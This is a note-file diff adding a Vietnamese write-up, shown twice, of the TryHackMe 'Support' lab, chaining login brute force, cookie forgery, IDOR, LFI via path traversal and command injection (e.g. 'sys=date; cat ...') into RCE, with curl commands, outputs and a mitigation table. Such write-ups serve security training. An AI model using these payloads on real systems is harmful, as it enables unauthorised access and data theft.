@@ -6,10 +6,10 @@ tags:
 ---
 
 
-<div class="excalidraw-container" id="ex-d6v2yt">
+<div class="excalidraw-container" id="ex-pyr3dc">
   <div class="excalidraw-toolbar">
     <div class="excalidraw-badge">
-      <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 19l7-7 3 3-7 7-3-3z"></path><path d="M18 13l-1.5-7.5L2 2l3.5 14.5L13 18l5-5z"></path><path d="M2 2l7.586 7.586"></path><circle cx="11" cy="11" r="2"></circle></svg>
+      <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect><circle cx="8.5" cy="8.5" r="1.5"></circle><polyline points="21 15 16 10 5 21"></polyline></svg>
       <span>Excalidraw Mindmap</span>
     </div>
     <div class="excalidraw-controls">
@@ -22,6 +22,273 @@ tags:
   <div class="excalidraw-viewport">
     <div class="excalidraw-canvas-wrapper">
       <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1057 5504" class="excalidraw-svg" data-width="1057" data-height="5504">
+<g transform="translate(-27.09,-133.18)">
+
+<rect x="67.08865356445312" y="173.1799774169922" width="900" height="5424" rx="8" fill="#ffffff" stroke="#e0e0e0" stroke-width="1.5" class="excalidraw-md-bg"/>
+<foreignObject x="67.08865356445312" y="173.1799774169922" width="900" height="5424" class="excalidraw-foreign-md">
+  <div xmlns="http://www.w3.org/1999/xhtml" class="notion-embed-card">
+    <div class="notion-embed-header">
+      <div class="notion-embed-header-left">
+        <span class="notion-embed-icon">📝</span>
+        <span class="notion-embed-title">Writeup — Support Operations Panel (TryHackMe &quot;Support&quot;)</span>
+      </div>
+      <a href="#doc-db7a6ae9f28dd692e8c02c52d4f43ba6a79bbd5d" class="notion-embed-jump" title="Cuộn xuống đọc chi tiết toàn bộ nội dung">↓ Đọc bài viết</a>
+    </div>
+    <div class="notion-embed-body">
+      <h1>Writeup — Support Operations Panel (TryHackMe &quot;Support&quot;)</h1>
+<p><strong>Mục tiêu:</strong> <code>http://10.48.187.204/</code>
+<strong>Ngày:</strong> 29/08/2026
+<strong>Thư mục:</strong> <code>/home/ti/SEUCURITY_LABLAB/THM/support_lab/</code>
+<strong>Kết quả cuối:</strong> Lấy được flag admin (<code>THM{I_AM_ADMIN999}</code>) và flag user (<code>THM{GOT_THE_FLAG001}</code>) — đạt RCE.</p>
+<hr>
+<h2>Tóm tắt chuỗi khai thác (Attack Chain)</h2>
+<pre><code>Brute-force login ──► Cookie tampering (isITUser=md5(&quot;true&quot;))
+   ──► IDOR /user/{id} ──► tìm admin email
+   ──► Constrained LFI (?skin=) ──► đọc master password
+   ──► Login admin ──► Command Injection (sys=) ──► RCE ──► FLAG
+</code></pre>
+<p>5 lỗ hổng được xích lại với nhau:</p>
+<ol>
+<li><strong>Brute-force</strong> (không rate limiting) → có tài khoản <code>help@support.thm</code></li>
+<li><strong>Cookie tampering</strong> (<code>isITUser</code> = hash boolean, không ký) → leo quyền IT</li>
+<li><strong>IDOR</strong> trên API <code>/user/{id}</code> → lộ email admin</li>
+<li><strong>Constrained LFI</strong> qua <code>?skin=</code> → đọc source <code>config.php</code> lộ master password</li>
+<li><strong>Command Injection</strong> qua <code>sys=</code> → RCE</li>
+</ol>
+<hr>
+<h2>Bước 0 — Recon trong <code>/info.php</code></h2>
+<p><code>/info.php</code> là trang <code>phpinfo()</code> công khai, lộ cấu hình sẵn dùng cho các bước sau:</p>
+<pre><code class="language-bash">curl -s http://10.48.187.204/info.php
+</code></pre>
+<p>Thông tin thu được:</p>
+<ul>
+<li>PHP <code>8.3.6</code>, Apache Ubuntu, <code>DOCUMENT_ROOT=/var/www/html</code></li>
+<li><code>disable_functions</code>: <strong>no value</strong> (hàm system không bị chặn)</li>
+<li><code>session.save_path=/var/lib/php/sessions</code></li>
+<li>Website chạy user <code>www-data</code></li>
+</ul>
+<hr>
+<h2>Bước 1 — Liệt kê endpoints &amp; thư mục</h2>
+<pre><code class="language-bash"># Quét thư mục với gobuster
+gobuster dir -u http://10.48.187.204/ \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -x php,html,txt,bak -o gobuster.txt
+
+# Kiểm tra directory listing
+curl -s http://10.48.187.204/includes/
+curl -s http://10.48.187.204/skins/
+</code></pre>
+<p>Kết quả:</p>
+<pre><code>/index.php        (200)  login
+/config.php       (200)  0 bytes  (file cấu hình, không output)
+/footer.php       (200)  chứa theme selector ?skin=
+/info.php         (200)  phpinfo
+/dashboard.php    (302 → index)  auth-gated
+/api.php          (302 → index)  auth-gated
+/logout.php       (302 → index)
+/includes/{header.php, skin.php}
+/skins/{default.php, blue.php, green.php, red.php}
+</code></pre>
+<hr>
+<h2>Bước 2 — Brute-force đăng nhập (không rate limiting)</h2>
+<p><strong>Khóa username:</strong> trang login hiển thị placeholder/contact <strong><code>help@support.thm</code></strong> → đây là tài khoản hợp lệ.</p>
+<p><strong>Khóa khác:</strong> form không giới hạn số lần thử (gửi 50 req/giây vẫn 200), nên brute-force thoải mái.</p>
+<p>Dùng script Python dò nhiều luồng, tín hiệu thành công = phản hồi <strong>302 redirect sang <code>/dashboard.php</code></strong> hoặc <strong>Set-Cookie <code>isITUser=...</code></strong>:</p>
+<pre><code class="language-bash"># thử thủ công vài mật khẩu để xác nhận tín hiệu
+curl -s -D - -o /dev/null -X POST \
+  --data-urlencode &quot;email=help@support.thm&quot; --data-urlencode &quot;password=x&quot; \
+  http://10.48.187.204/ | grep -iE &#39;HTTP/|Location|set-cookie&#39;
+</code></pre>
+<p>Tài khoản tìm được:</p>
+<pre><code>email    : help@support.thm
+password : snoopy
+</code></pre>
+<hr>
+<h2>Bước 3 — Đăng nhập &amp; Cookie Tampering (Broken Access Control)</h2>
+<p>Đăng nhập lưu cookie:</p>
+<pre><code class="language-bash">curl -s -c cookies.txt -L -X POST \
+  --data-urlencode &quot;email=help@support.thm&quot; \
+  --data-urlencode &quot;password=snoopy&quot; \
+  http://10.48.187.204/
+</code></pre>
+<p>Kiểm tra cookie (trong <code>/tmp/dash.html</code>, dashboard):</p>
+<pre><code class="language-bash">cat cookies.txt | grep -iE &#39;phpsessid|isituser&#39;
+</code></pre>
+<p>Kết quả — dashboard set cookie <strong><code>isITUser</code></strong>:</p>
+<pre><code>isITUser=68934a3e9455fa72420237eb05902327
+PHPSESSID=...
+</code></pre>
+<p><strong>Phân tích:</strong> giá trị 32 ký tự hex = <strong>MD5</strong>. Giải mã:</p>
+<pre><code class="language-bash">echo -n &quot;false&quot; | md5sum   # 68934a3e9455fa72420237eb05902327  ✔ khớp!
+echo -n &quot;true&quot;  | md5sum   # b326b5062b2f0e69046810717534cb09
+</code></pre>
+<p>→ Cookie lưu hash của boolean <strong>role</strong>, <strong>không ký/tamper-proof</strong> → chỉ cần đổi sang <code>md5(&quot;true&quot;)</code>.</p>
+<p><strong>Forge cookie để thành IT User:</strong></p>
+<pre><code class="language-bash">SID=$(grep -i phpsessid cookies.txt | awk &#39;{print $NF}&#39;)
+CK=&quot;PHPSESSID=$SID; isITUser=b326b5062b2f0e69046810717534cb09&quot;
+
+# xác nhận mở khóa IT Admin Panel
+curl -s -b &quot;$CK&quot; http://10.48.187.204/dashboard.php | grep -iE &#39;IT Admin|View API&#39;
+</code></pre>
+<p>→ Xuất hiện <strong>&quot;IT Admin Panel&quot;</strong> với nút <strong>View API</strong>.</p>
+<hr>
+<h2>Bước 4 — IDOR trên API <code>/user/{id}</code></h2>
+<p>API <code>api.php</code> route qua <strong>PATH_INFO</strong> dạng <code>/user/{id}</code>. Trước khi đổi cookie (helpdesk) nó <strong>khóa về đúng user của mình (id=3)</strong>; sau khi thành IT User mới liệt kê được người khác.</p>
+<p>Enumerate user ID:</p>
+<pre><code class="language-bash">for id in $(seq 1 10); do
+  echo &quot;--- /user/$id ---&quot;
+  curl -s -b &quot;$CK&quot; &quot;http://10.48.187.204/user/$id&quot;; echo
+done
+</code></pre>
+<p>Kết quả (đã xác minh):</p>
+<pre><code>/user/1 → { &quot;email&quot;: &quot;specialadmin@support.thm&quot;, &quot;2FA&quot;: false, &quot;admin&quot;: true  }
+/user/2 → { &quot;email&quot;: &quot;IT@support.thm&quot;,           &quot;2FA&quot;: false, &quot;admin&quot;: false }
+/user/3 → { &quot;email&quot;: &quot;help@support.thm&quot;,         &quot;2FA&quot;: false, &quot;admin&quot;: false }
+/user/4 → null
+</code></pre>
+<blockquote>
+<p>⚠️ Phải gọi <strong><code>/user/{id}</code></strong> (path), KHÔNG phải <code>/api.php/user/{id}</code> (cái này hiển thị HTML tĩnh và bỏ qua tham số).</p>
+</blockquote>
+<p><strong>Kết quả:</strong> tìm được admin <strong><code>specialadmin@support.thm</code></strong> (admin: true).</p>
+<hr>
+<h2>Bước 5 — Constrained LFI qua <code>?skin=</code> để đọc source</h2>
+<p>Dashboard có theme selector <code>?skin=default|red|green|blue</code>. Nó <code>include()</code> file <code>skins/{value}.php</code> không whitelist → <strong>LFI bị giới hạn (.php)</strong>, nhưng vẫn đọc được các file <code>.php</code> của server, <strong>in raw source</strong> (kể cả <code>&lt;?php</code>).</p>
+<p>Đọc <code>config.php</code> (chứa master password):</p>
+<pre><code class="language-bash">curl -s -b &quot;$CK&quot; \
+  &quot;http://10.48.187.204/dashboard.php?skin=../../../../../var/www/html/config&quot; \
+  | grep -iE &#39;password|MASTER|SITE&#39;
+</code></pre>
+<p>Kết quả lộ source:</p>
+<pre><code class="language-php">&lt;?php
+$MASTER_PASSWORD = &#39;support@110&#39;;
+$SITE_VER  = &#39;1.0&#39;;
+$SITE_NAME = &#39;support_portal&#39;;
+</code></pre>
+<p><strong>Master password = <code>support@110</code>.</strong></p>
+<hr>
+<h2>Bước 6 — Login admin</h2>
+<p>Ghép email admin + password từ config. <strong>Mẹo:</strong> server <strong>loại bỏ ký tự <code>@</code></strong> khi so sánh → password thực tế dùng là <code>support110</code> (bỏ <code>@</code>):</p>
+<pre><code class="language-bash"># dùng mật khẩu có @ (bị lỗi - ở lại login)
+curl -s -L -X POST \
+  --data-urlencode &quot;email=specialadmin@support.thm&quot; \
+  --data-urlencode &quot;password=support@110&quot; http://10.48.187.204/ | grep -iE &#39;Welcome&#39;
+
+# ✔ đúng: bỏ @
+curl -s -c admin.cookie -L -X POST \
+  --data-urlencode &quot;email=specialadmin@support.thm&quot; \
+  --data-urlencode &quot;password=support110&quot; http://10.48.187.204/ \
+  | grep -iE &#39;THM|Administrator&#39;
+</code></pre>
+<p>Kết quả — <strong>FLAG 1 (admin)</strong>:</p>
+<pre><code>🎯 Administrator Access Confirmed
+THM{I_AM_ADMIN999}
+</code></pre>
+<hr>
+<h2>Bước 7 — Command Injection (<code>sys=</code>) → RCE</h2>
+<p>Admin dashboard có widget chọn &quot;Date&quot;/&quot;Time&quot; gửi POST tham số <strong><code>sys</code></strong> vào <code>shell_exec()</code>. Source lộ ra điều kiện: <strong><code>$sys</code> phải bắt đầu bằng <code>date</code></strong> → ta chèn sau dấu <code>;</code>.</p>
+<p>Xác nhận RCE (chạy <code>id</code>):</p>
+<pre><code class="language-bash">curl -s -b admin.cookie -X POST \
+  --data-urlencode &quot;sys=date; id&quot; \
+  http://10.48.187.204/dashboard.php | grep -iE &#39;uid=&#39;
+</code></pre>
+<p>Kết quả:</p>
+<pre><code>uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</code></pre>
+<p><strong>Đọc flag user:</strong></p>
+<pre><code class="language-bash">curl -s -b admin.cookie -X POST \
+  --data-urlencode &quot;sys=date; cat /home/ubuntu/user.txt&quot; \
+  http://10.48.187.204/dashboard.php | grep -iE &#39;THM&#39;
+</code></pre>
+<p><strong>FLAG 2 (user): <code>THM{GOT_THE_FLAG001}</code></strong></p>
+<p><em>(Không có <code>root.txt</code> — user <code>www-data</code> không đủ quyền truy cập <code>/root</code>; flag user là mục tiêu cuối của room.)</em></p>
+<hr>
+<h2>Kết quả cuối</h2>
+<table>
+<thead>
+<tr>
+<th align="left">Hạng mục</th>
+<th align="left">Giá trị</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Tài khoản helpdesk</td>
+<td align="left"><code>help@support.thm</code> / <code>snoopy</code></td>
+</tr>
+<tr>
+<td align="left">Cookie IT (forged)</td>
+<td align="left"><code>isITUser=b326b5062b2f0e69046810717534cb09</code> (= md5 &quot;true&quot;)</td>
+</tr>
+<tr>
+<td align="left">Admin email</td>
+<td align="left"><code>specialadmin@support.thm</code></td>
+</tr>
+<tr>
+<td align="left">Master password</td>
+<td align="left"><code>support@110</code> → dùng <code>support110</code></td>
+</tr>
+<tr>
+<td align="left"><strong>Flag admin</strong></td>
+<td align="left"><strong><code>THM{I_AM_ADMIN999}</code></strong></td>
+</tr>
+<tr>
+<td align="left"><strong>Flag user</strong></td>
+<td align="left"><strong><code>THM{GOT_THE_FLAG001}</code></strong></td>
+</tr>
+</tbody></table>
+<hr>
+<h2>Tổng hợp lỗ hổng (Mitigation tương ứng)</h2>
+<table>
+<thead>
+<tr>
+<th align="left">#</th>
+<th align="left">Lỗ hổng</th>
+<th align="left">Bản chất</th>
+<th align="left">Khắc phục</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">1</td>
+<td align="left">No rate limiting</td>
+<td align="left">Brute-force được</td>
+<td align="left">Rate limit / account lockout / CAPTCHA</td>
+</tr>
+<tr>
+<td align="left">2</td>
+<td align="left">Cookie tamper</td>
+<td align="left"><code>isITUser</code> = unsigned MD5 của boolean</td>
+<td align="left">Dùng session server-side, sign cookie, không dùng client để quyết định quyền</td>
+</tr>
+<tr>
+<td align="left">3</td>
+<td align="left">IDOR (BOLA)</td>
+<td align="left"><code>/user/{id}</code> không kiểm tra quyền sở hữu</td>
+<td align="left">Kiểm tra authorization trước khi trả object</td>
+</tr>
+<tr>
+<td align="left">4</td>
+<td align="left">Constrained LFI</td>
+<td align="left"><code>?skin=</code> include không whitelist</td>
+<td align="left">Whitelist nghiêm ngặt giá trị skin</td>
+</tr>
+<tr>
+<td align="left">5</td>
+<td align="left">Command Injection</td>
+<td align="left"><code>sys=</code> nối thẳng vào <code>shell_exec</code></td>
+<td align="left">Không truyền input người dùng vào shell; dùng whitelist lệnh</td>
+</tr>
+<tr>
+<td align="left">6</td>
+<td align="left">Config lộ qua LFI</td>
+<td align="left"><code>config.php</code> chứa password cleartext</td>
+<td align="left">Không nhúng secret trong source; cấu hình ngoài docroot</td>
+</tr>
+</tbody></table>
+
+    </div>
+  </div>
+</foreignObject>
+
+</g>
 <g transform="translate(-27.09,-133.18)">
 <path d="M1043.55 1003.12 L1043.55 1003.12" stroke="#1e1e1e" stroke-width="1" fill="none" stroke-linecap="round" stroke-linejoin="round"/>
 </g>
@@ -65,3 +332,290 @@ tags:
     </div>
   </div>
 </div>
+
+
+---
+
+## 📖 Nội dung chi tiết bài viết (Writeup)
+
+<div id="doc-db7a6ae9f28dd692e8c02c52d4f43ba6a79bbd5d" class="notion-callout-card">
+
+# Writeup — Support Operations Panel (TryHackMe "Support")
+
+**Mục tiêu:** `http://10.48.187.204/`
+**Ngày:** 29/08/2026
+**Thư mục:** `/home/ti/SEUCURITY_LABLAB/THM/support_lab/`
+**Kết quả cuối:** Lấy được flag admin (`THM{I_AM_ADMIN999}`) và flag user (`THM{GOT_THE_FLAG001}`) — đạt RCE.
+
+---
+
+## Tóm tắt chuỗi khai thác (Attack Chain)
+
+```
+Brute-force login ──► Cookie tampering (isITUser=md5("true"))
+   ──► IDOR /user/{id} ──► tìm admin email
+   ──► Constrained LFI (?skin=) ──► đọc master password
+   ──► Login admin ──► Command Injection (sys=) ──► RCE ──► FLAG
+```
+
+5 lỗ hổng được xích lại với nhau:
+1. **Brute-force** (không rate limiting) → có tài khoản `help@support.thm`
+2. **Cookie tampering** (`isITUser` = hash boolean, không ký) → leo quyền IT
+3. **IDOR** trên API `/user/{id}` → lộ email admin
+4. **Constrained LFI** qua `?skin=` → đọc source `config.php` lộ master password
+5. **Command Injection** qua `sys=` → RCE
+
+---
+
+## Bước 0 — Recon trong `/info.php`
+
+`/info.php` là trang `phpinfo()` công khai, lộ cấu hình sẵn dùng cho các bước sau:
+
+```bash
+curl -s http://10.48.187.204/info.php
+```
+
+Thông tin thu được:
+- PHP `8.3.6`, Apache Ubuntu, `DOCUMENT_ROOT=/var/www/html`
+- `disable_functions`: **no value** (hàm system không bị chặn)
+- `session.save_path=/var/lib/php/sessions`
+- Website chạy user `www-data`
+
+---
+
+## Bước 1 — Liệt kê endpoints & thư mục
+
+```bash
+# Quét thư mục với gobuster
+gobuster dir -u http://10.48.187.204/ \
+  -w /usr/share/seclists/Discovery/Web-Content/common.txt \
+  -x php,html,txt,bak -o gobuster.txt
+
+# Kiểm tra directory listing
+curl -s http://10.48.187.204/includes/
+curl -s http://10.48.187.204/skins/
+```
+
+Kết quả:
+```
+/index.php        (200)  login
+/config.php       (200)  0 bytes  (file cấu hình, không output)
+/footer.php       (200)  chứa theme selector ?skin=
+/info.php         (200)  phpinfo
+/dashboard.php    (302 → index)  auth-gated
+/api.php          (302 → index)  auth-gated
+/logout.php       (302 → index)
+/includes/{header.php, skin.php}
+/skins/{default.php, blue.php, green.php, red.php}
+```
+
+---
+
+## Bước 2 — Brute-force đăng nhập (không rate limiting)
+
+**Khóa username:** trang login hiển thị placeholder/contact **`help@support.thm`** → đây là tài khoản hợp lệ.
+
+**Khóa khác:** form không giới hạn số lần thử (gửi 50 req/giây vẫn 200), nên brute-force thoải mái.
+
+Dùng script Python dò nhiều luồng, tín hiệu thành công = phản hồi **302 redirect sang `/dashboard.php`** hoặc **Set-Cookie `isITUser=...`**:
+
+```bash
+# thử thủ công vài mật khẩu để xác nhận tín hiệu
+curl -s -D - -o /dev/null -X POST \
+  --data-urlencode "email=help@support.thm" --data-urlencode "password=x" \
+  http://10.48.187.204/ | grep -iE 'HTTP/|Location|set-cookie'
+```
+
+Tài khoản tìm được:
+
+```
+email    : help@support.thm
+password : snoopy
+```
+
+---
+
+## Bước 3 — Đăng nhập & Cookie Tampering (Broken Access Control)
+
+Đăng nhập lưu cookie:
+
+```bash
+curl -s -c cookies.txt -L -X POST \
+  --data-urlencode "email=help@support.thm" \
+  --data-urlencode "password=snoopy" \
+  http://10.48.187.204/
+```
+
+Kiểm tra cookie (trong `/tmp/dash.html`, dashboard):
+
+```bash
+cat cookies.txt | grep -iE 'phpsessid|isituser'
+```
+
+Kết quả — dashboard set cookie **`isITUser`**:
+```
+isITUser=68934a3e9455fa72420237eb05902327
+PHPSESSID=...
+```
+
+**Phân tích:** giá trị 32 ký tự hex = **MD5**. Giải mã:
+
+```bash
+echo -n "false" | md5sum   # 68934a3e9455fa72420237eb05902327  ✔ khớp!
+echo -n "true"  | md5sum   # b326b5062b2f0e69046810717534cb09
+```
+
+→ Cookie lưu hash của boolean **role**, **không ký/tamper-proof** → chỉ cần đổi sang `md5("true")`.
+
+**Forge cookie để thành IT User:**
+
+```bash
+SID=$(grep -i phpsessid cookies.txt | awk '{print $NF}')
+CK="PHPSESSID=$SID; isITUser=b326b5062b2f0e69046810717534cb09"
+
+# xác nhận mở khóa IT Admin Panel
+curl -s -b "$CK" http://10.48.187.204/dashboard.php | grep -iE 'IT Admin|View API'
+```
+
+→ Xuất hiện **"IT Admin Panel"** với nút **View API**.
+
+---
+
+## Bước 4 — IDOR trên API `/user/{id}`
+
+API `api.php` route qua **PATH_INFO** dạng `/user/{id}`. Trước khi đổi cookie (helpdesk) nó **khóa về đúng user của mình (id=3)**; sau khi thành IT User mới liệt kê được người khác.
+
+Enumerate user ID:
+
+```bash
+for id in $(seq 1 10); do
+  echo "--- /user/$id ---"
+  curl -s -b "$CK" "http://10.48.187.204/user/$id"; echo
+done
+```
+
+Kết quả (đã xác minh):
+
+```
+/user/1 → { "email": "specialadmin@support.thm", "2FA": false, "admin": true  }
+/user/2 → { "email": "IT@support.thm",           "2FA": false, "admin": false }
+/user/3 → { "email": "help@support.thm",         "2FA": false, "admin": false }
+/user/4 → null
+```
+
+> ⚠️ Phải gọi **`/user/{id}`** (path), KHÔNG phải `/api.php/user/{id}` (cái này hiển thị HTML tĩnh và bỏ qua tham số).
+
+**Kết quả:** tìm được admin **`specialadmin@support.thm`** (admin: true).
+
+---
+
+## Bước 5 — Constrained LFI qua `?skin=` để đọc source
+
+Dashboard có theme selector `?skin=default|red|green|blue`. Nó `include()` file `skins/{value}.php` không whitelist → **LFI bị giới hạn (.php)**, nhưng vẫn đọc được các file `.php` của server, **in raw source** (kể cả `<?php`).
+
+Đọc `config.php` (chứa master password):
+
+```bash
+curl -s -b "$CK" \
+  "http://10.48.187.204/dashboard.php?skin=../../../../../var/www/html/config" \
+  | grep -iE 'password|MASTER|SITE'
+```
+
+Kết quả lộ source:
+
+```php
+<?php
+$MASTER_PASSWORD = 'support@110';
+$SITE_VER  = '1.0';
+$SITE_NAME = 'support_portal';
+```
+
+**Master password = `support@110`.**
+
+---
+
+## Bước 6 — Login admin
+
+Ghép email admin + password từ config. **Mẹo:** server **loại bỏ ký tự `@`** khi so sánh → password thực tế dùng là `support110` (bỏ `@`):
+
+```bash
+# dùng mật khẩu có @ (bị lỗi - ở lại login)
+curl -s -L -X POST \
+  --data-urlencode "email=specialadmin@support.thm" \
+  --data-urlencode "password=support@110" http://10.48.187.204/ | grep -iE 'Welcome'
+
+# ✔ đúng: bỏ @
+curl -s -c admin.cookie -L -X POST \
+  --data-urlencode "email=specialadmin@support.thm" \
+  --data-urlencode "password=support110" http://10.48.187.204/ \
+  | grep -iE 'THM|Administrator'
+```
+
+Kết quả — **FLAG 1 (admin)**:
+
+```
+🎯 Administrator Access Confirmed
+THM{I_AM_ADMIN999}
+```
+
+---
+
+## Bước 7 — Command Injection (`sys=`) → RCE
+
+Admin dashboard có widget chọn "Date"/"Time" gửi POST tham số **`sys`** vào `shell_exec()`. Source lộ ra điều kiện: **`$sys` phải bắt đầu bằng `date`** → ta chèn sau dấu `;`.
+
+Xác nhận RCE (chạy `id`):
+
+```bash
+curl -s -b admin.cookie -X POST \
+  --data-urlencode "sys=date; id" \
+  http://10.48.187.204/dashboard.php | grep -iE 'uid='
+```
+
+Kết quả:
+```
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+**Đọc flag user:**
+
+```bash
+curl -s -b admin.cookie -X POST \
+  --data-urlencode "sys=date; cat /home/ubuntu/user.txt" \
+  http://10.48.187.204/dashboard.php | grep -iE 'THM'
+```
+
+**FLAG 2 (user): `THM{GOT_THE_FLAG001}`**
+
+*(Không có `root.txt` — user `www-data` không đủ quyền truy cập `/root`; flag user là mục tiêu cuối của room.)*
+
+---
+
+## Kết quả cuối
+
+| Hạng mục | Giá trị |
+|:---|:---|
+| Tài khoản helpdesk | `help@support.thm` / `snoopy` |
+| Cookie IT (forged) | `isITUser=b326b5062b2f0e69046810717534cb09` (= md5 "true") |
+| Admin email | `specialadmin@support.thm` |
+| Master password | `support@110` → dùng `support110` |
+| **Flag admin** | **`THM{I_AM_ADMIN999}`** |
+| **Flag user** | **`THM{GOT_THE_FLAG001}`** |
+
+---
+
+## Tổng hợp lỗ hổng (Mitigation tương ứng)
+
+| # | Lỗ hổng | Bản chất | Khắc phục |
+|:--|:---|:---|:---|
+| 1 | No rate limiting | Brute-force được | Rate limit / account lockout / CAPTCHA |
+| 2 | Cookie tamper | `isITUser` = unsigned MD5 của boolean | Dùng session server-side, sign cookie, không dùng client để quyết định quyền |
+| 3 | IDOR (BOLA) | `/user/{id}` không kiểm tra quyền sở hữu | Kiểm tra authorization trước khi trả object |
+| 4 | Constrained LFI | `?skin=` include không whitelist | Whitelist nghiêm ngặt giá trị skin |
+| 5 | Command Injection | `sys=` nối thẳng vào `shell_exec` | Không truyền input người dùng vào shell; dùng whitelist lệnh |
+| 6 | Config lộ qua LFI | `config.php` chứa password cleartext | Không nhúng secret trong source; cấu hình ngoài docroot |
+
+</div>
+
+---
+
